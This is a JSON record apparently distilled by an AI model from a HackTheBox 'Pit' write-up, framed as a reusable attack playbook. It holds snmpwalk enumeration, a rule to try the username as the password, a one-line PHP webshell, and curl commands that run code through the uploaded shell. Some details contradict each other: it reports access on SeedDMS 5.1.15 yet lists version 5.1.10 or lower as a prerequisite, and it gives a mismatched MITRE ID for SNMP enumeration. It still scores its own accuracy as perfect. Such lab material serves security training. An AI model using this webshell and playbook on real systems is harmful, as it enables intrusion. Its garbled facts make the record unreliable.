{
  "writeup_id": "Htb_Pit",
  "scenario_fingerprint": {
    "scenario_name": "linux_snmp_seeddms_cockpit_privilege_escalation",
    "primary_services": [
      "snmp",
      "http",
      "ssh",
      "cockpit"
    ],
    "port_signature": "22+80+161+9090",
    "service_combination": "ssh+http+snmp+cockpit",
    "os_family": "linux_redhat",
    "environment_type": "enterprise_linux",
    "entry_vector": "snmp_enumeration_to_webshell",
    "privilege_path": "webshell_to_user_to_root_via_snmp",
    "attack_complexity": "medium",
    "estimated_time": "90-120 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "selinux_enabled_blocking_reverse_shells",
      "snmp_writable_scripts",
      "seeddms_webshell_upload",
      "cockpit_web_terminal"
    ],
    "environmental_clues": [
      "nginx_redhat_default_page",
      "ssl_cert_reveals_hostname",
      "snmp_v1_public_community",
      "cockpit_remote_access_portal"
    ],
    "similar_scenarios": [
      "linux_snmp_enumeration",
      "seeddms_exploitation"
    ],
    "unique_aspects": [
      "selinux_protection_bypass",
      "snmp_script_execution_privilege_escalation",
      "dual_http_services_different_purposes"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "SNMP_Enumeration",
        "success_reason": "Default community string 'public' was enabled with extensive information disclosure",
        "prerequisite_indicators": [
          "udp_161_open",
          "snmp_service_responding",
          "default_community_strings_enabled"
        ],
        "recognition_patterns": [
          "snmpwalk returns extensive data",
          "NET-SNMP-EXTEND-MIB reveals custom scripts",
          "process lists and system info exposed"
        ],
        "failure_modes": [
          "snmp_disabled",
          "custom_community_strings_only",
          "snmp_access_restricted"
        ],
        "environmental_factors": [
          "default_snmp_configuration",
          "monitoring_scripts_configured",
          "insufficient_access_controls"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "Certificate_Domain_Discovery",
        "success_reason": "SSL certificate revealed additional domain dms-pit.htb",
        "prerequisite_indicators": [
          "https_service_available",
          "ssl_certificate_present",
          "subject_alternative_names_configured"
        ],
        "recognition_patterns": [
          "nmap ssl-cert script output",
          "commonName and SAN fields populated",
          "domain naming suggests document management"
        ],
        "failure_modes": [
          "self_signed_generic_certificates",
          "no_alternative_names",
          "certificate_not_revealing_info"
        ],
        "environmental_factors": [
          "proper_certificate_deployment",
          "multiple_services_on_host",
          "domain_based_virtual_hosting"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "2-5 minutes"
      },
      {
        "technique": "Virtual_Host_Discovery",
        "success_reason": "Multiple domains (dms-pit.htb, pit.htb) hosted different content",
        "prerequisite_indicators": [
          "web_server_responding",
          "domain_names_discovered",
          "virtual_host_configuration"
        ],
        "recognition_patterns": [
          "different responses per domain",
          "403 vs default pages",
          "hostname-based routing"
        ],
        "failure_modes": [
          "single_domain_configuration",
          "all_domains_same_content",
          "strict_host_header_validation"
        ],
        "environmental_factors": [
          "nginx_virtual_host_setup",
          "multiple_applications_deployed",
          "domain_based_access_controls"
        ],
        "success_probability": 0.7,
        "typical_timeframe": "5-10 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "dms-pit.htb domain from SSL certificate",
        "discovery_method": "nmap ssl-cert script on port 9090",
        "why_critical": "Revealed document management system suggesting file upload vulnerabilities",
        "how_to_recognize": [
          "commonName field in certificate",
          "subject alternative names",
          "dms prefix suggests document management"
        ],
        "follow_up_actions": [
          "add_domain_to_hosts_file",
          "enumerate_web_directories",
          "identify_dms_software_version"
        ]
      },
      {
        "discovery": "SNMP with default community string",
        "discovery_method": "UDP scan and snmpwalk with 'public'",
        "why_critical": "Extensive system information disclosure including processes and configurations",
        "how_to_recognize": [
          "udp 161 open in nmap",
          "snmpwalk returns data with 'public'",
          "NET-SNMP-EXTEND-MIB entries present"
        ],
        "follow_up_actions": [
          "dump_full_snmp_tree",
          "analyze_process_lists",
          "check_extend_mib_scripts"
        ]
      },
      {
        "discovery": "SELinux enabled system",
        "discovery_method": "SNMP enumeration revealed SELinux configuration",
        "why_critical": "Indicates restricted execution environment affecting payload delivery",
        "how_to_recognize": [
          "selinux settings in snmp output",
          "centos/rhel operating system",
          "security contexts in process lists"
        ],
        "follow_up_actions": [
          "research_selinux_bypasses",
          "focus_on_web_based_shells",
          "identify_allowed_execution_contexts"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "information_gathering",
        "escalation_method": "SNMP_to_WebApp_Discovery",
        "why_possible": "SNMP provided system details while certificate revealed additional attack surface",
        "recognition_signs": [
          "multiple_domains_in_certificates",
          "snmp_revealing_system_architecture",
          "document_management_system_indicators"
        ],
        "exploitation_path": "SNMP Enum → Domain Discovery → DMS Identification → File Upload Attack"
      },
      {
        "privilege_level": "web_application",
        "escalation_method": "DMS_FileUpload_to_RCE",
        "why_possible": "Document management systems commonly have file upload functionality with insufficient validation",
        "recognition_signs": [
          "dms_in_domain_name",
          "file_upload_endpoints_present",
          "insufficient_file_type_validation"
        ],
        "exploitation_path": "SeedDMS Discovery → Upload Webshell → Remote Code Execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80,9090 open on Linux host with SNMP on UDP 161",
        "decision": "Enumerate SNMP first for information disclosure",
        "reasoning": "SNMP often reveals system information, usernames, and file paths without authentication",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "web_enumeration",
            "when": "if snmp fails or requires auth"
          },
          {
            "option": "ssl_cert_analysis",
            "when": "if https service present"
          }
        ],
        "success_indicators": [
          "snmp_responds_to_public_community",
          "system_information_disclosed",
          "usernames_found",
          "file_paths_revealed"
        ],
        "next_decision": "analyze_snmp_output_for_attack_vectors"
      },
      {
        "step": 2,
        "situation": "SNMP reveals username 'michelle' and web path '/var/www/html/seeddms51x/seeddms'",
        "decision": "Access discovered web application path and attempt credential reuse",
        "reasoning": "SNMP disclosed both username and specific application path, credential reuse common",
        "confidence": 0.85,
        "prerequisites": [
          "username_from_snmp",
          "web_path_discovered"
        ],
        "success_indicators": [
          "login_successful",
          "application_access_gained"
        ],
        "failure_fallbacks": [
          "password_spraying",
          "default_credentials",
          "application_enumeration"
        ]
      },
      {
        "step": 3,
        "situation": "Authenticated to SeedDMS 5.1.15 with michelle:michelle",
        "decision": "Research known vulnerabilities for specific version",
        "reasoning": "Document management systems often have file upload vulnerabilities",
        "confidence": 0.95,
        "prerequisites": [
          "application_version_identified",
          "authenticated_access"
        ],
        "success_indicators": [
          "cve_found",
          "exploit_available",
          "file_upload_possible"
        ],
        "failure_fallbacks": [
          "manual_functionality_testing",
          "privilege_enumeration"
        ]
      }
    ],
    "branching_logic": {
      "if_snmp_enumeration_succeeds": {
        "action": "extract_usernames_and_paths",
        "tools": [
          "snmpwalk",
          "snmp-check"
        ],
        "next_phase": "credential_testing_on_discovered_services"
      },
      "if_credentials_work": {
        "action": "enumerate_application_version_and_functionality",
        "purpose": "identify_exploit_opportunities",
        "tools": [
          "burp",
          "manual_testing"
        ]
      },
      "if_file_upload_vulnerability_found": {
        "action": "attempt_webshell_upload",
        "considerations": [
          "selinux_restrictions",
          "file_type_filtering"
        ],
        "tools": [
          "custom_webshell",
          "curl"
        ]
      },
      "if_selinux_blocks_reverse_shell": {
        "action": "use_webshell_for_enumeration_and_credential_discovery",
        "purpose": "find_alternative_access_methods",
        "next_phase": "search_for_service_credentials"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_enumerate_snmp_with_public_community_first",
        "reasoning": "high_information_disclosure_potential_with_minimal_effort",
        "applicability": "snmp_service_detected"
      },
      {
        "rule": "test_username_as_password_on_discovered_applications",
        "reasoning": "common_weak_credential_pattern",
        "applicability": "username_discovered_through_enumeration"
      },
      {
        "rule": "research_specific_application_versions_for_cves",
        "reasoning": "version_specific_exploits_often_available",
        "applicability": "application_version_identified"
      },
      {
        "rule": "adapt_payload_delivery_when_selinux_detected",
        "reasoning": "selinux_blocks_many_standard_techniques",
        "applicability": "selinux_enabled_systems"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "SNMP_Enumeration",
        "mitre_id": "T1040",
        "required_services": [
          "snmp"
        ],
        "required_ports": [
          161
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "snmp_service_enabled",
          "default_community_strings",
          "snmp_accessible_remotely"
        ],
        "success_indicators": [
          "snmpwalk_returns_data",
          "system_information_disclosed",
          "process_list_accessible"
        ],
        "incompatible_with": [
          "snmp_disabled",
          "custom_community_strings_only",
          "snmp_firewall_blocked"
        ],
        "confidence_boosters": [
          "public_community_string",
          "snmpv1_or_v2c_enabled",
          "default_configuration"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "2-10 minutes"
      },
      {
        "technique": "Web_Directory_Enumeration",
        "mitre_id": "T1083",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443,
          9090
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "web_server_running",
          "directory_listing_enabled_or_predictable_paths"
        ],
        "success_indicators": [
          "directories_discovered",
          "files_accessible",
          "different_response_codes"
        ],
        "incompatible_with": [
          "web_application_firewall",
          "rate_limiting_aggressive",
          "all_paths_return_same_response"
        ],
        "confidence_boosters": [
          "default_web_server_installation",
          "common_cms_patterns",
          "predictable_naming_conventions"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "5-30 minutes"
      },
      {
        "technique": "Virtual_Host_Discovery",
        "mitre_id": "T1590.001",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443,
          9090
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "web_server_running",
          "virtual_hosts_configured",
          "dns_names_in_certificates"
        ],
        "success_indicators": [
          "ssl_certificate_contains_domains",
          "different_responses_per_host_header",
          "dns_enumeration_reveals_subdomains"
        ],
        "incompatible_with": [
          "single_site_configuration",
          "wildcard_certificate_only",
          "strict_host_header_validation"
        ],
        "confidence_boosters": [
          "multiple_dns_names_in_cert",
          "subdomain_naming_patterns",
          "shared_hosting_environment"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "2-15 minutes"
      },
      {
        "technique": "Service_Banner_Grabbing",
        "mitre_id": "T1046",
        "required_services": [
          "any"
        ],
        "required_ports": [
          "any"
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "services_running",
          "banners_not_customized"
        ],
        "success_indicators": [
          "version_information_disclosed",
          "service_type_identified",
          "operating_system_fingerprinted"
        ],
        "incompatible_with": [
          "banner_grabbing_disabled",
          "custom_banners_only",
          "service_behind_proxy"
        ],
        "confidence_boosters": [
          "default_service_configuration",
          "verbose_banners_enabled",
          "multiple_services_running"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "1-5 minutes"
      }
    ],
    "environmental_detectors": {
      "snmp_service": {
        "port_indicators": [
          161,
          162
        ],
        "service_indicators": [
          "snmp"
        ],
        "banner_indicators": [
          "SNMPv1",
          "SNMPv2c",
          "SNMPv3",
          "net-snmp"
        ],
        "confidence_threshold": 0.95
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443,
          9090
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "nginx",
          "apache",
          "iis"
        ],
        "confidence_threshold": 0.9
      },
      "linux_system": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "OpenSSH",
          "Red Hat",
          "CentOS"
        ],
        "confidence_threshold": 0.85
      },
      "cockpit_service": {
        "port_indicators": [
          9090
        ],
        "service_indicators": [
          "ssl/zeus-admin"
        ],
        "banner_indicators": [
          "CentOS",
          "Red Hat",
          "remote access"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "snmp_enumeration",
          "when": "snmp_service_detected",
          "reason": "often_reveals_sensitive_system_information"
        },
        {
          "attack": "virtual_host_discovery",
          "when": "ssl_certificate_contains_multiple_domains",
          "reason": "reveals_additional_attack_surface"
        }
      ],
      "medium_priority": [
        {
          "attack": "web_directory_enumeration",
          "when": "web_service_detected",
          "reason": "may_reveal_hidden_applications"
        },
        {
          "attack": "service_version_enumeration",
          "when": "multiple_services_detected",
          "reason": "identifies_potential_vulnerabilities"
        }
      ],
      "low_priority": [
        {
          "attack": "ssh_enumeration",
          "when": "ssh_service_detected",
          "reason": "typically_requires_credentials_first"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "SNMP Enumeration",
        "mitre_id": "T1040",
        "category": "discovery",
        "phase": "reconnaissance",
        "tools_used": [
          {
            "name": "snmpwalk",
            "command_template": "snmpwalk -v1 -c {community} {target} . > {output_file}",
            "actual_command": "snmpwalk -v1 -c public 10.10.10.241 . > scans/snmpwalk-full",
            "output_pattern": "NET-SNMP-EXTEND-MIB::nsExtendOutputFull",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "snmp_service_accessible",
          "valid_community_string"
        ],
        "success_indicators": [
          "system_information_disclosed",
          "user_accounts_revealed",
          "file_paths_exposed",
          "process_list_obtained"
        ],
        "common_failures": [
          "invalid_community_string",
          "snmp_service_disabled",
          "network_connectivity_issues"
        ],
        "follow_up_techniques": [
          "credential_guessing",
          "web_directory_enumeration",
          "service_exploitation"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "SeedDMS File Upload RCE",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl http://{target}/seeddms51x/data/1048576/{doc_id}/1.php?cmd={command}",
            "actual_command": "curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=id",
            "output_pattern": "uid=992(nginx) gid=988(nginx)",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "seeddms_version_5.1.10_or_lower",
          "valid_user_credentials",
          "upload_permissions",
          "nginx_webserver"
        ],
        "success_indicators": [
          "php_webshell_uploaded_successfully",
          "command_execution_confirmed",
          "system_information_retrieved"
        ],
        "common_failures": [
          "apache_htaccess_blocking",
          "insufficient_upload_permissions",
          "selinux_restrictions"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "credential_harvesting",
          "lateral_movement"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Credential Guessing",
        "mitre_id": "T1110.001",
        "category": "credential_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "manual_testing",
            "command_template": "username:password combinations",
            "actual_command": "michelle:michelle",
            "output_pattern": "successful_login_redirect",
            "effectiveness_rating": 3,
            "reliability": 0.3
          }
        ],
        "prerequisites": [
          "valid_username_identified",
          "login_form_accessible",
          "weak_password_policy"
        ],
        "success_indicators": [
          "successful_authentication",
          "access_to_protected_resources",
          "session_established"
        ],
        "common_failures": [
          "account_lockout_policies",
          "strong_password_requirements",
          "multi_factor_authentication"
        ],
        "follow_up_techniques": [
          "application_exploitation",
          "data_exfiltration",
          "privilege_escalation"
        ],
        "time_investment": "5-30 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "snmpwalk",
        "use_case": "network_service_enumeration",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "network_reconnaissance"
        ],
        "alternatives": [
          "snmp-check",
          "onesixtyone"
        ],
        "best_practices": [
          "try_default_community_strings_first",
          "save_full_output_for_analysis",
          "focus_on_extend_mib_sections"
        ]
      },
      {
        "tool": "feroxbuster",
        "use_case": "web_directory_enumeration",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "low",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "gobuster",
          "dirbuster",
          "ffuf"
        ],
        "best_practices": [
          "use_appropriate_wordlists",
          "check_different_status_codes",
          "enumerate_virtual_hosts"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "snmp_to_web_exploitation",
        "steps": [
          {
            "step": 1,
            "command": "snmpwalk -v1 -c public 10.10.10.241 . > scans/snmpwalk-full",
            "purpose": "Enumerate SNMP for system information",
            "expected_output": "System details, usernames, file paths"
          },
          {
            "step": 2,
            "command": "grep -i 'www\\|html\\|web' scans/snmpwalk-full",
            "purpose": "Extract web-related paths from SNMP data",
            "expected_output": "/var/www/html/seeddms51x/seeddms"
          },
          {
            "step": 3,
            "command": "curl http://dms-pit.htb/seeddms51x/seeddms/",
            "purpose": "Access discovered web application",
            "expected_output": "SeedDMS login page"
          },
          {
            "step": 4,
            "command": "echo '<?php system($_REQUEST[\"cmd\"]); ?>' > shell.php",
            "purpose": "Create PHP webshell",
            "expected_output": "Webshell file created"
          },
          {
            "step": 5,
            "command": "curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=id",
            "purpose": "Execute commands via uploaded webshell",
            "expected_output": "uid=992(nginx) gid=988(nginx)"
          }
        ],
        "success_rate": 0.8,
        "typical_duration": "20-40 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Pit",
      "difficulty": "Medium",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2021-05-15",
      "author": "polarbearer, GibParadox",
      "estimated_time": "2-3 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "snmp_enumeration",
        "web_application",
        "selinux_bypass"
      ],
      "key_vulnerabilities": [
        "snmp_information_disclosure",
        "file_upload",
        "script_execution_via_snmp"
      ],
      "environment_type": "linux_server_with_selinux",
      "real_world_relevance": "high",
      "learning_value": [
        "snmp_exploitation",
        "selinux_constraints",
        "cockpit_usage",
        "seeddms_exploitation"
      ],
      "prerequisite_knowledge": [
        "snmp_basics",
        "web_application_testing",
        "linux_fundamentals"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "snmp_exploitation",
        "selinux_bypass",
        "privilege_escalation"
      ],
      "attack_types": [
        "information_disclosure",
        "file_upload",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "snmp_hardening",
        "file_upload_restrictions",
        "selinux_configuration",
        "service_isolation"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Networked",
        "Poison",
        "Node"
      ],
      "similarity_reasons": [
        "file_upload_vulnerabilities",
        "web_application_focus",
        "selinux_constraints"
      ],
      "unique_aspects": [
        "dual_snmp_exploitation",
        "cockpit_terminal_access",
        "seeddms_platform"
      ],
      "difficulty_factors": [
        "selinux_blocking_reverse_shells",
        "snmp_script_execution",
        "multi_stage_enumeration"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T23:05:36.373075",
    "original_file": "0xdf_writeups/Htb Pit.md",
    "content_length": 33702,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}